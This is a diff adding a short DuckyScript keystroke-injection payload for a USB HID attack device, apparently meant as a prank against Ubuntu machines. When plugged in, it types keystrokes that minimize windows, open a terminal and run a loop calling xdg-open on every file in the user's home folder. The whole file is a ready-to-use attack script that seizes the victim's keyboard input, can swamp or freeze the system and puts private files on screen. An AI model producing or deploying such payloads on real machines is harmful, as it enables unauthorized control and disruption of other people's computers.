@@ -1,0 +1,18 @@
+REM This script opens everything in the home folder 
+REM Tested on Ubuntu 25.04
+REM Minimizes every window
+WINDOWS d
+DELAY 800
+REM Opens a terminal
+CTRL-ALT t
+DELAY 800
+REM Goes to /home/$USER directory
+STRING cd ~
+DELAY 800
+ENTER
+DELAY 800
+REM Lists every file in folders and subfolders and opens it
+STRING for i in $(find . -type f); do xdg-open $i; done
+DELAY 800
+ENTER
+REM Enjoy the view :)
